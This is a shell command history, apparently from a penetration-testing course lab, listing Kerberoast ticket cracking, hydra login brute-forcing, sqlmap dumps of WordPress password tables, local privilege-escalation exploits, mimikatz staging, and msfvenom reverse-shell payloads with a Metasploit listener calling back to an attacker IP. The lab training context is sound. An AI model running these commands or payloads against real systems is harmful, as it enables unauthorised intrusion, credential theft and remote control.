 4724  2020-10-20 09:35  find / 2>/dev/null | grep powerview
 4725  2020-10-20 09:37  locate /  | grep power view
 4726  2020-10-20 09:37  locate /  | grep "power view"
 4727  2020-10-20 09:38  locate powerview
 4728  2020-10-20 09:39  ps
 4729  2020-10-20 09:39  ps aux
 4730  2020-10-20 09:40  powershell
 4731  2020-10-20 09:40  locate /  | grep powershell
 4732  2020-10-20 09:44  /home/kali/.cache/powershell/7.0.0\n
 4733  2020-10-20 09:45  cd /opt/microsoft/powershell/7/Modules\n
 4734  2020-10-20 09:47  git clone https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
 4735  2020-10-20 09:47  sudo git clone https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
 4736  2020-10-20 09:47  sudo git clone https://github.com/PowerShellEmpire/PowerTools.git
 4737  2020-10-20 09:52  Penetration Testing with Kali Linux\n725\n/\n853\n
 4738  2020-10-20 09:52  cd Empire
 4739  2020-10-20 09:55  cd plugins
 4740  2020-10-20 10:04  locate /  | grep powerview
 4741  2020-10-20 10:05  locate /  | grep power
 4742  2020-10-20 10:05  sudo locate /  | grep powerview
 4743  2020-10-20 10:06  cd Modules
 4744  2020-10-20 10:07  cd PSReadLine
 4745  2020-10-20 10:08  locate /  | grep powertools
 4746  2020-10-20 10:08  git clone https://github.com/PowerShellEmpire/PowerTools.git
 4747  2020-10-20 10:10  lsof -i:80
 4748  2020-10-20 10:10  kill $(lsof -t -i:80)\n
 4749  2020-10-20 10:11  net stop http\n
 4750  2020-10-20 10:11  sudo net stop http\n
 4751  2020-10-20 10:12  netstat -nao | find ":80"
 4752  2020-10-20 10:16  /etc/init.d/apache2 stop
 4753  2020-10-20 21:50  touch Get-SPN.ps1
 4754  2020-10-20 21:50  vim Get-SPN.ps1
 4755  2020-10-20 20:31  cd results/10.3.3.190
 4756  2020-10-20 20:31  cherrytree HARRY.ctb
 4757  2020-10-20 10:26  #htc --forward-port 8080 192.168.217.44:1234\n
 4758  2020-10-20 23:36  sudo apt update && sudo apt install kerberoast
 4759  2020-10-20 23:40  ython /usr/share/kerberoast/tgsrepcrack.py
 4760  2020-10-20 23:40  python /usr/share/kerberoast/tgsrepcrack.py
 4761  2020-10-20 23:41  locate rockyou
 4762  2020-10-20 23:41  python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
 4763  2020-10-20 23:42  vim /usr/share/wordlists/rockyou.txt
 4764  2020-10-20 23:43  touch wordlist.txt
 4765  2020-10-20 23:43  vim w
 4766  2020-10-20 23:43  vim 1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
 4767  2020-10-20 23:44  python /usr/share/kerberoast/tgsrepcrack.py 1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
 4768  2020-10-21 00:01  impacket-smbserver sharename
 4769  2020-10-21 00:04  impacket-smbserver /home/kali/OSCPdata/\n
 4770  2020-10-21 00:06  impacket-smbserver SPITFIRE \n
 4771  2020-10-21 00:06  impacket-smbserver SPITFIRE  /home/kali/OSCPdata/  \n
 4772  2020-10-21 00:06  sudo impacket-smbserver SPITFIRE  /home/kali/OSCPdata/  \n
 4773  2020-10-21 00:09  mv ~/Downloads/wordlist.txt ./
 4774  2020-10-21 00:10  python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
 4775  2020-10-21 00:24  vim wordlist.txt
 4776  2020-10-21 00:24  python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a10000-offsec@HOST\~Client251.corp.com-CORP.COM.kirbi
 4777  2020-10-21 00:39  python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a10000-offsec@TERMSRV\~Client251.corp.com-CORP.COM.kirbi
 4778  2020-10-21 00:43  python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a10000-offsec@kadmin\~changepw-CORP.COM.kirbi
 4779  2020-10-21 00:43  python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a10000-offsec@HOST\~Client251.corp.com-CORP.COM.kirbi
 4780  2020-10-21 00:43  python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a10000-offsec@TERMSRV\~Client251.corp.com-CORP.COM.kirbi
 4781  2020-10-21 00:43  python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
 4782  2020-10-21 00:52  python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@ldap~DC01.corp.com-CORP.COM.kirbi
 4783  2020-10-21 00:52  python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a10000-offsec@MSSQLSvc~CorpSqlServer.corp.com~1433-CORP.COM.kirbi
 4784  2020-10-21 01:03  /usr/sbin/john -w=./wordlist.txt 1-40a10000-offsec@MSSQLSvc\~CorpSqlServer.corp.com\~1433-CORP.COM.kirbi
 4785  2020-10-21 01:04  /usr/sbin/john  --rules -w=/usr/share/wordlists/rockyou.txt 1-40a10000-offsec@MSSQLSvc\~CorpSqlServer.corp.com\~1433-CORP.COM.kirbi
 4786  2020-10-21 01:05  /usr/sbin/john  --show
 4787  2020-10-21 01:06  /usr/sbin/john 1-40a10000-offsec@MSSQLSvc\~CorpSqlServer.corp.com\~1433-CORP.COM.kirbi --show
 4788  2020-10-21 01:06  /usr/sbin/john  --rules -w=/usr/share/wordlists/rockyou.txt 1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
 4789  2020-10-21 01:07  /usr/sbin/john  --format=HMAC-SHA512 --rules -w=/home/kali/oscpdata/wordlist.txt 1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
 4790  2020-10-21 01:07  /usr/sbin/john  1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi --show
 4791  2020-10-21 01:08  /usr/share/john/kirbi2john.py raj.kirbi > kirbihash\n
 4792  2020-10-21 01:08  /usr/share/john/kirbi2john.py 1-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi > kirbihash\n
 4793  2020-10-21 01:09  /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt kirbihash
 4794  2020-10-21 01:10  /usr/sbin/john --wordlist=/home/kali/oscpdata/wordlist.txt kirbihash
 4795  2020-10-21 01:17  touch kerbroast
 4796  2020-10-21 01:17  vim k
 4797  2020-10-21 01:19  vim kerbroast
 4798  2020-10-21 01:19  /usr/sbin/john --wordlist=/home/kali/oscpdata/wordlist.txt kerbroast
 4799  2020-10-21 01:32  cat hashes.txt
 4800  2020-10-21 01:32  /usr/sbin/john --wordlist=/home/kali/oscpdata/wordlist.txt hashes.txt
 4801  2020-10-21 01:38  vim hashes.txt
 4802  2020-10-21 01:38  sudo vim hashes.txt
 4803  2020-10-21 01:39  python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt hashes.txt
 4804  2020-10-21 01:39  locate / | grep hashccat
 4805  2020-10-21 01:40  locate / | grep hashcat
 4806  2020-10-21 01:42  /usr/share/hashcat-utils
 4807  2020-10-21 01:42  /usr/share/hashcat-utils --help
 4808  2020-10-21 01:42  sudo apt install hashcat
 4809  2020-10-21 01:45  /usr/sbin/john  --format=HMAC-SHA512 --rules -w=/home/kali/oscpdata/wordlist.txt hashes.txt
 4810  2020-10-21 01:46  /usr/sbin/john  --format=HMAC-SHA512 --rules -w=/home/kali/oscpdata/wordlist.txt hashtest.txt
 4811  2020-10-21 01:47  /usr/sbin/john  hashtest.txt --show
 4812  2020-10-21 01:47  /usr/sbin/john  --rules -w=/home/kali/oscpdata/wordlist.txt hashtest.txt
 4813  2020-10-20 10:20  sudo locate /  | grep powertools
 4814  2020-10-20 10:20  sudo locate /  | grep power
 4815  2020-10-20 10:21  cd /home/kali/.cache/powershell
 4816  2020-10-20 10:21  cd 7.0.0
 4817  2020-10-20 10:21  cd /home/kali/.local/share/powershell
 4818  2020-10-20 10:21  cd PowerTools/l
 4819  2020-10-20 10:21  cd PowerTools
 4820  2020-10-20 10:21  cd Power
 4821  2020-10-20 10:21  cd PowerView
 4822  2020-10-20 10:22  sudo python -m SimpleHTTPServer 8080
 4823  2020-10-20 10:33  sudo lsof -iTCP:8080 -sTCP:LISTEN\n
 4824  2020-10-20 10:33  sudo kill -9 585
 4825  2020-10-21 02:25  ping  10.11.1.11
 4826  2020-10-21 02:25  ping  10.11.1.111
 4827  2020-10-21 02:25  ping  10.11.1.5
 4828  2020-10-21 04:14  rdesktop -u kaitlyn -p thisismysecret  10.3.3.14
 4829  2020-10-21 04:56  rdesktop -u root -p   192.168.217.44
 4830  2020-10-21 04:57  rdesktop -u root -p lab  192.168.217.44
 4831  2020-10-21 04:57  \l
 4832  2020-10-21 05:02  ping 192.168.217.4
 4833  2020-10-21 05:03  ping 192.168.217.44
 4834  2020-10-21 05:09  ping 192.168.217.10
 4835  2020-10-22 08:59  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
 4836  2020-10-22 09:40  llk
 4837  2020-10-24 21:37  sll
 4838  2020-10-24 21:37  git clone https://github.com/flozz/p0wny-shell.git
 4839  2020-10-24 21:39  ld
 4840  2020-10-24 21:40  cd p0wny-shell
 4841  2020-10-24 22:18  locate / | grep netcat
 4842  2020-10-24 22:22  locate / | grep netcat.exe
 4843  2020-10-24 22:23  locate / | grep .exe
 4844  2020-10-24 22:25  find / | grep windows/tools
 4845  2020-10-24 22:25  locate  / | grep windows/tools
 4846  2020-10-24 22:27  unzip netcat-win32-1.12.zip
 4847  2020-10-24 22:29  unzip netcat-win32-1.11.zip
 4848  2020-10-21 05:28  rdesktop -u offsec  -p lab 172.16.217.5
 4849  2020-10-21 05:48  rdesktop -u offsec  -p lab 192.168.217.10
 4850  2020-10-22 07:09  sudo systemctl start postgresql
 4851  2020-10-22 07:09  sudo systemctl enable postgresql
 4852  2020-10-22 09:18  sudo msfconsole -qu
 4853  2020-10-22 19:51  rdesktop -u offsec   192.168.217.10
 4854  2020-10-22 23:44  pip
 4855  2020-10-22 23:45  cd /opt/Empire
 4856  2020-10-22 23:47  vim cert.sh
 4857  2020-10-22 23:47  ./cert.sh
 4858  2020-10-22 23:47  ./install.sh
 4859  2020-10-22 23:48  sudo apt-get install m2crypto swig\n\n
 4860  2020-10-22 23:56  sudo  powershell-empire
 4861  2020-10-23 06:52  ping 10.5.5.30
 4862  2020-10-23 06:53  ping 10.4.4.10
 4863  2020-10-23 06:54  nmap 10.4.4.10
 4864  2020-10-23 06:54  nmap -Pn 10.4.4.10
 4865  2020-10-23 06:57  nmap 10.5.5.20
 4866  2020-10-23 06:58  source /etc/hsots
 4867  2020-10-23 06:58  source /etc/hsotssudo nmap -sC -sS -p0-65535 sandbox.local
 4868  2020-10-23 06:58  sudo nmap -sC -sS -p0-65535 sandbox.local
 4869  2020-10-23 07:03  dirb http://sandbox.local
 4870  2020-10-23 07:04  wpscan --url sandbox.local --enumerate ap,at,cb,dbe
 4871  2020-10-23 07:22  searchsploit elementor
 4872  2020-10-23 07:27  sqlmap http://sandbox.local/
 4873  2020-10-23 07:31  sqlmap http://sandbox.local/ --crawl=2
 4874  2020-10-23 20:58  cd 10.3.3.47
 4875  2020-10-23 20:59  cherrytree Jack.ctb
 4876  2020-10-23 21:46  cd 10.11.1.73/report
 4877  2020-10-23 21:46  cat tcp_10243_http_whatweb.txt
 4878  2020-10-23 21:46  cat tcp_8080_http_whatweb.txt
 4879  2020-10-23 21:48  curl http://10.11.1.73:8080/PHP/
 4880  2020-10-23 21:53  locatephp/webapps/27949.txt 
 4881  2020-10-23 21:53  locate php/webapps/27949.txt 
 4882  2020-10-23 21:53  vim /usr/share/exploitdb/exploits/php/webapps/27949.txt
 4883  2020-10-23 21:57  locate php/webapps/25816.txt
 4884  2020-10-23 21:57  vim /usr/share/exploitdb/exploits/php/webapps/25816.txt
 4885  2020-10-23 22:03  ca tcp_10243_http_nikto.txt
 4886  2020-10-23 22:03  cat tcp_10243_http_nikto.txt
 4887  2020-10-23 22:03  cat tcp_2869_http_nikto.txt
 4888  2020-10-23 22:03  cat tcp_5357_http_nikto.txt
 4889  2020-10-23 22:03  cat tcp_8014_http_nikto.txt
 4890  2020-10-23 22:06  hydra  -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form//10.11.1.73:8080/PHP/index.php\?tg\=login\&cmd\=authform\&msg\=Login\&err\=
 4891  2020-10-23 22:06  hydra  -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form://10.11.1.73:8080/PHP/index.php\?tg\=login\&cmd\=authform\&msg\=Login\&err\=
 4892  2020-10-23 22:07  hydra  -U admin -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/home/kali/OSCP/results/10.11.1.234/scans/tcp_80_http_form_hydra.txt" http-post-form://10.11.1.73:8080/PHP/index.php\?tg\=login\&cmd\=authform\&msg\=Login\&err\=
 4893  2020-10-23 22:08  hydra -l megan -P /usr/share/wordlists/wfuzz/others/common_pass.txt -e nsr -s 22 -o tcp_22_ssh_hydra.txt ssh://10.1.1.27
 4894  2020-10-23 22:09  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/home/kali/OSCP/results/10.11.1.73/scans/tcp_8080_http_form_hydra.txt" http-post-form://10.11.1.73:8080/PHP/index.php\?tg\=login\&cmd\=authform\&msg\=Login\&err\=
 4895  2020-10-23 22:10  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/home/kali/OSCP/results/10.11.1.73/scans/
 4896  2020-10-23 22:10  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 
 4897  2020-10-23 22:13  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 10000 -o "/home/kali/OSCP/results/10.11.1.141/scans/tcp_10000_http_auth_hydra.txt" http-get://10.11.1.73:8080/PHP/index.php\?tg\=login\&cmd\=authform\&msg\=Login\&err\=User+not+found+or+bad+password
 4898  2020-10-23 22:14  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/home/kali/OSCP/results/10.11.1.141/scans/tcp_10000_http_auth_hydra.txt" http-get://10.11.1.73:8080/PHP/index.php\?tg\=login\&cmd\=authform\&msg\=Login\&err\=User+not+found+or+bad+password
 4899  2020-10-23 22:14  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/home/kali/OSCP/results/10.11.1.73/scans/tcp_8080_http_auth_hydra.txt" http-get://10.11.1.73:8080/PHP/index.php\?tg\=login\&cmd\=authform\&msg\=Login\&err\=User+not+found+or+bad+password
 4900  2020-10-24 07:27  git commit -m "started gamma"
 4901  2020-10-25 01:54  git commit -m "finished gemma"
 4902  2020-10-25 21:18  sqlmap
 4903  2020-10-25 21:29  #sqlmap -u "http://10.11.1.222:8080/blog/login.jsp" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T wp_users -dump
 4904  2020-10-25 21:30  sqlmap -u "http://sandbox.local/" --technique BT --dbms MariaDB --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T wp_users -dump
 4905  2020-10-25 21:30  sqlmap -u "http://sandbox.local/" --technique BT --dbms MYSQL  --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T wp_users -dump
 4906  2020-10-25 21:46  sqlmap -u "http://sandbox.local/" --technique BT --dbms MYSQL  --risk 3 --level 5 -p wpas_keys --tamper space2comment --threads 10 -D wordpress -T wp_table -dump
 4907  2020-10-25 22:48  vim burppost
 4908  2020-10-26 02:17  sqlmap -r request.txt -p id
 4909  2020-10-26 02:17  sqlmap -r ./request.txt -p id
 4910  2020-10-26 02:17  sqlmap -r ./request.txt -p 
 4911  2020-10-26 02:17  sqlmap -r ./request.txt -p names
 4912  2020-10-26 02:18  sqlmap -h
 4913  2020-10-26 02:25  sqlmap -r ./request.txt -p action
 4914  2020-10-26 02:31  sqlmap -r ./request.txt -p sss_params
 4915  2020-10-26 02:36  vim request2.txt
 4916  2020-10-26 02:37  sqlmap -r ./request2.txt -p 
 4917  2020-10-26 02:37  sqlmap -r ./request.txt -p wp_sap
 4918  2020-10-26 02:38  sqlmap -r ./request2.txt -p wp_sap
 4919  2020-10-26 02:38  sqlmap -r ./request2.txt -p id
 4920  2020-10-26 02:38  sqlmap -r ./request2.txt -p options
 4921  2020-10-26 02:40  sqlmap -r ./request.txt -p options
 4922  2020-10-26 02:44  sqlmap -r ./request.txt -p sspcmd
 4923  2020-10-26 02:45  cat request2.txt
 4924  2020-10-26 02:45  sqlmap -r ./request.txt -p wp_sap=["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]
 4925  2020-10-26 07:22  sqlmap -r ./request.txt -p save --tamper=space2comment
 4926  2020-10-26 07:28  vim request.txt 
 4927  2020-10-26 07:29  sqlmap -r ./request.txt -p options --tamper=space2comment
 4928  2020-10-26 07:30  sqlmap -r ./request.txt -p sss_params --tamper=space2comment
 4929  2020-10-26 08:22  cat request
 4930  2020-10-26 08:29  vim request
 4931  2020-10-26 08:30  rm request2.txt
 4932  2020-10-26 08:57  sqlmap -r ./request.txt --sql-query="select from wp_users"
 4933  2020-10-26 08:57  sqlmap -r ./request.txt --sql-query="select from user_pass,user_login"
 4934  2020-10-26 09:07  sqlmap -r ./request.txt OR 1=2 *#"];
 4935  2020-10-26 09:07  sqlmap -r ./request.txt --sql-query="OR 1=2 *#"];"
 4936  2020-10-26 09:08  cat request.txt
 4937  2020-10-26 09:11  sqlmap -r ./request.txt --sql-query="select * from wp_users"
 4938  2020-10-26 09:13  vim request.txt
 4939  2020-10-26 09:17  sqlmap -r ./request.txt --sql-query="select * from user_pass"
 4940  2020-10-26 09:27  sqlmap -r ./request.txt --sql-query="select user_pass from wp_users"
 4941  2020-10-26 09:29  lls
 4942  2020-10-26 19:35  locate 46249.py
 4943  2020-10-26 19:36  vim /usr/share/exploitdb/exploits/linux/local/46249.py
 4944  2020-10-27 04:38  vim /usr/share/exploitdb/exploits/linux_x86/local/46249.py
 4945  2020-10-27 04:43  cp /usr/share/exploitdb/exploits/linux_x86/local/46249.py ./
 4946  2020-10-27 04:43  chmod +x 46249.py
 4947  2020-10-27 04:43  python 46249.py
 4948  2020-10-27 05:16  python 46249.py root pass
 4949  2020-10-27 05:16  python 46249.py --username root --password mysql
 4950  2020-10-22 08:53  msfvenom
 4951  2020-10-22 08:53  msfvenom -help
 4952  2020-10-22 09:04  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f js_le -e generic/none
 4953  2020-10-22 09:05  %udb31%ue3f7%u4353%u6a53%u8902%ub0e1%ucd66%u9380%ub059%ucd3f%u4980%uf979%uc068%u77a8%u68d9%u0002%ubb01%ue189%u66b0%u5150%ub353%u8903%ucde1%u5280%u6e68%u732f%u6868%u2f2f%u6962%ue389%u5352%ue189%u0bb0%u80cd\n
 4954  2020-10-22 09:07  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=4444 -f exe > adduser.exe
 4955  2020-10-22 09:07  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=4444 -f exe > useradd.exe
 4956  2020-10-22 09:10  sudo kill -9 584
 4957  2020-10-22 09:14  #msfvenom -p windows/ LHOST=192.168.119.217 LPORT=4444 -f exe > adduser.exe
 4958  2020-10-22 09:14  msfvenom -p windows
 4959  2020-10-22 09:14  msfvenom -p windows --help
 4960  2020-10-22 09:14  msfvenom --list payloads to 
 4961  2020-10-22 09:14  msfvenom --list payloads 
 4962  2020-10-22 09:16  msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.217 LPORT=4444 -f exe > adduser.exe
 4963  2020-10-22 20:55  vim /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
 4964  2020-10-22 21:18  gems /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
 4965  2020-10-22 21:18  gem /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
 4966  2020-10-22 21:18  ./root/.msf4/modules/exploits/windows/http/syncbreeze.rb
 4967  2020-10-22 21:33  sudo vim /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
 4968  2020-10-22 21:56  sudo proxychains rdesktop 172.16.217.5
 4969  2020-10-22 21:58  sudo vim /etc/proxychains.conf
 4970  2020-10-22 22:36  localte setup.rc
 4971  2020-10-22 22:36  locate setup.rc
 4972  2020-10-22 22:37  locate / | grep setup.rc
 4973  2020-10-22 22:38  touch setup.rc
 4974  2020-10-22 22:41  sudo msfconsole -r setup.rc
 4975  2020-10-22 23:08  locate empire
 4976  2020-10-22 23:08  cd /opt/Empire/empire
 4977  2020-10-22 23:08  .//opt/Empire/empire
 4978  2020-10-22 23:09  ./opt/Empire/empire/opt/Empire
 4979  2020-10-22 23:09  /opt/Empire/empire
 4980  2020-10-22 23:09  cd /opt/Empire/
 4981  2020-10-22 23:09  sudo /opt/Empire/empire
 4982  2020-10-22 23:10  pip install --user kali flask
 4983  2020-10-22 23:11  pip3 install --user kali flask
 4984  2020-10-22 23:12  cd setup/
 4985  2020-10-22 23:12  sl
 4986  2020-10-22 23:12  sudo ./install.sh
 4987  2020-10-22 23:13  sudo ./lib
 4988  2020-10-22 23:13  sudo ./.build.sh
 4989  2020-10-22 23:13  vim re
 4990  2020-10-22 23:13  vim reset.sh
 4991  2020-10-22 23:14  sudo ./reset.sh
 4992  2020-10-22 23:16  locate / |grep empire
 4993  2020-10-22 23:19  sudo ./setup/install.sh
 4994  2020-10-22 23:23  pip install -U pip setuptools\n
 4995  2020-10-22 23:23  pip install --user pyinstaller
 4996  2020-10-22 23:23  pip3 install --user pyinstaller
 4997  2020-10-22 23:24  pip install --user flask
 4998  2020-10-22 23:25  pip install  flask
 4999  2020-10-22 23:25  ls -akl
 5000  2020-10-22 23:25  sudo pip3 install -r "requirements.txt"\n
 5001  2020-10-22 23:27  cd ./setup
 5002  2020-10-22 23:27  ./empire
 5003  2020-10-22 23:27  sudo ./empire
 5004  2020-10-22 23:27  cd setup
 5005  2020-10-22 23:27  vim requirements.txt
 5006  2020-10-22 23:27  sudo vim requirements.txt
 5007  2020-10-22 23:28  sudo pip install -r "requirements.txt"\n
 5008  2020-10-22 23:29  pip upgrade
 5009  2020-10-22 23:29  pip -h
 5010  2020-10-22 23:30  pip install --upgrade typing
 5011  2020-10-23 00:04  pip install --upgrade 
 5012  2020-10-23 00:04  cat /tmp/launcher.bat
 5013  2020-10-23 07:01  nmap -sT -v 10.11.1.75\n
 5014  2020-10-23 07:02  nmap -sT -sC 10.11.1.75\n
 5015  2020-10-23 07:02  nmap -sT -sC -Pn 10.11.1.75\n
 5016  2020-10-23 07:03  nmap  -Pn 10.11.1.75\n
 5017  2020-10-23 07:07  cd ..cd ..
 5018  2020-10-23 07:07  cd 10.11.1.73/
 5019  2020-10-23 21:00  cd 10.11.1.44
 5020  2020-10-23 21:23  rdesktop -u webadmin 10.11.1.222
 5021  2020-10-23 21:25  rdesktop -u webadmin 10.11.1.229
 5022  2020-10-23 21:25  cat chrispass.txt
 5023  2020-10-23 21:25  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt chrispass.txt
 5024  2020-10-23 21:28  /usr/sbin/john  chrispass.txt --show
 5025  2020-10-23 21:33  cat tcp_5357_http_gobuster.txt
 5026  2020-10-23 21:34  head tcp_8014_http_gobuster.txt
 5027  2020-10-23 21:34  more tcp_8014_http_gobuster.txt
 5028  2020-10-23 21:34  tcp_8014_http_gobuster.txt | gerp 200
 5029  2020-10-23 21:34  tcp_8014_http_gobuster.txt | grep 200
 5030  2020-10-23 21:35  grep 200 tcp_8014_http_gobuster.txt
 5031  2020-10-23 21:35  cat tcp_8014_http_gobuster.txt
 5032  2020-10-23 21:35  ag
 5033  2020-10-23 21:35  /home/kali/.cargo/bin/rg
 5034  2020-10-23 21:36  /home/kali/.cargo/bin/rg 200 tcp_8014_http_gobuster.txt
 5035  2020-10-23 21:36  /home/kali/.cargo/bin/rg 200 tcp_8080_http_gobuster.txt
 5036  2020-10-23 21:38  dig http://10.11.1.73:8080
 5037  2020-10-23 21:45  sudo nmap -sU -sV 10.11.1.73
 5038  2020-10-23 21:52  gobuster dir -u http://10.11.1.73:8080/PHP/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  
 5039  2020-10-24 05:55  cat _nmap.txt
 5040  2020-10-24 05:56  cat tcp_10243_http_nikto.txt tcp_2869_http_nikto.txt tcp_5357_http_nikto.txt tcp_8014_http_nikto.txt tcp_8080_http_nikto.txt
 5041  2020-10-24 05:58  cat tcp_22_ssh_hydra.txt
 5042  2020-10-24 06:16  searchsploit Ovidentia
 5043  2020-10-24 23:00  locate win
 5044  2020-10-24 23:00  cd /home/kali/Downloads/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe
 5045  2020-10-25 00:06  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=4444 -f exe > shell.exe
 5046  2020-10-25 00:29  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=1234 -f exe > shell.exe
 5047  2020-10-25 07:27  ipo a
 5048  2020-10-25 07:28  nmap   10.11.1.1/24
 5049  2020-10-24 23:10  sudo locate /  | grep winpeas.bat
 5050  2020-10-24 23:13  find / 2>/dev/null | grep winPEAS
 5051  2020-10-24 23:21  cd /home/kali/OSCP/results/10.11.1.221/exploit/w
 5052  2020-10-24 23:21  cd /home/kali/OSCP/results/10.11.1.221/exploit/
 5053  2020-10-25 00:06  find / 2>/dev/null | grep juicy
 5054  2020-10-25 00:18  cd juicy-potato
 5055  2020-10-25 00:18  cd JuicyPotato
 5056  2020-10-25 00:18  rm kiwi_passwords.yar
 5057  2020-10-25 00:18  rm web2py.app.admin.w2p web2py.app.lol.w2p web2py.app.shadow.w2p 
 5058  2020-10-25 00:20  rm JuicyPotato\(1\).exe JuicyPotato\(2\).exe JuicyPotato\(3\).exe
 5059  2020-10-25 00:27  cd results/l
 5060  2020-10-25 00:27  cd results/
 5061  2020-10-25 00:27  cd exploit/l;
 5062  2020-10-25 00:27  cd exploit/l
 5063  2020-10-25 00:27  cd exploit/
 5064  2020-10-25 08:13  autorecon 10.11.1.122
 5065  2020-10-25 09:50  cat tcp_47001_http_index.html
 5066  2020-10-25 09:51  cat _http_robots.txt
 5067  2020-10-25 09:51  cat tcp_5985_http_robots.txt
 5068  2020-10-25 09:56  cat tcp_443_http_nmap.txt
 5069  2020-10-25 09:56  cat tcp_443_https_gobuster.txt
 5070  2020-10-28 10:08  sudo msfconsole -q -x "use exploit/multi/handler;\\n>\nset PAYLOAD linux/x86/meterpreter/reverse_tcp;\\n>\nset LHOST 192.168.119.217;\\n>\nset LPORT 443;\\n>\nrun"
 5071  2020-10-28 06:38  searchsploit 45584\n
 5072  2020-10-28 07:26  cat tcp_booksidr_http_gobuster_dirbuster.txt
 5073  2020-10-28 07:30  cp /home/kali/OSCP/results/10.11.1.222/exploit/mimikatz64.exe ./ 
 5074  2020-10-28 07:30  sudo python -m SimpleHTTPServer 5555
 5075  2020-10-28 07:31  sudo kill -9 635
 5076  2020-10-28 07:34  cp /usr/share/windows-resources/mimikatz/Win32/mimikatz32.exe ./
 5077  2020-10-28 07:34  cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./
 5078  2020-10-28 07:45  searchsploit jquery\n
 5079  2020-10-28 07:46  locate php/webapps/45584.txt
 5080  2020-10-28 07:46  vim /usr/share/exploitdb/exploits/php/webapps/45584.txt
 5081  2020-10-28 09:03  cat webshell.php
 5082  2020-10-28 19:26  ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@192.168.119.217
 5083  2020-10-29 01:48  sudo kill -9 15850
 5084  2020-10-28 19:25  ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@192.168.119.217
 5085  2020-10-29 08:17  searchsploit ubuntu 16.04
 5086  2020-10-29 08:17  locate V
 5087  2020-10-29 08:17  locate linux/local/45010.c
 5088  2020-10-29 08:17  cp /usr/share/exploitdb/exploits/linux/local/45010.c ./
 5089  2020-10-29 08:18  vim 45010.c
 5090  2020-10-29 08:18  /usr/share/bash-completion/completions/gcc
 5091  2020-10-29 08:18  gcc 45010.c -o 45010
